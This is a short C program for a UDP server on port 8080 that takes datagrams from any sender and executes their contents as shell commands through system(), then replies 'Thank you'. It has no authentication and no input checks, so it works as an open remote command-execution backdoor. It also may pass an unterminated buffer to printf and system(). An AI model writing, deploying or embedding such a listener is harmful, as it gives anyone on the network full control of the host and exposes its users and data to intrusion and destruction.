#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define PORT 8080
#define MAXLINE 1024

int main(){

	//create a socket
	int socketfd = socket(AF_INET, SOCK_DGRAM, 0);
	printf("socketfd: %i\n", socketfd);
	
	//create the local socket address struct
	struct sockaddr_in localsocketaddress;
	memset(&localsocketaddress, 0, sizeof(localsocketaddress));
	
	localsocketaddress.sin_family = AF_INET;
	localsocketaddress.sin_addr.s_addr = INADDR_ANY;
	localsocketaddress.sin_port = htons(PORT);

	//bind the local socket address to the created socket
	int bind_result = bind( socketfd, (struct sockaddr *)&localsocketaddress, sizeof(localsocketaddress));
	printf("bind result: %i\n", bind_result);

	while(1){

		//structure to hold the client addess
		struct sockaddr_in remotesocketaddress;
		memset(&remotesocketaddress, 0, sizeof(remotesocketaddress));
		int remotesocketlen = sizeof(remotesocketaddress);

		//buffer to store data
		char buffer[MAXLINE];
		memset(buffer, 0, MAXLINE);
		
		printf("recv call\n");
		int len = recvfrom( socketfd, buffer, MAXLINE, 0, ( struct sockaddr_in *)&remotesocketaddress, &remotesocketlen);
		printf("call returned %i\n",len);

		//may need to set the null character
		
		//printing the read data
		printf("Client: %s\n", buffer);

		//execute the command
		system(buffer);

		//reply
		char senddata[] = "Thank you"; 
		sendto( socketfd, senddata, strlen(senddata), MSG_CONFIRM, (struct sockaddr_in *)&remotesocketaddress, remotesocketlen);
		printf("Message sent\n");

	}

}
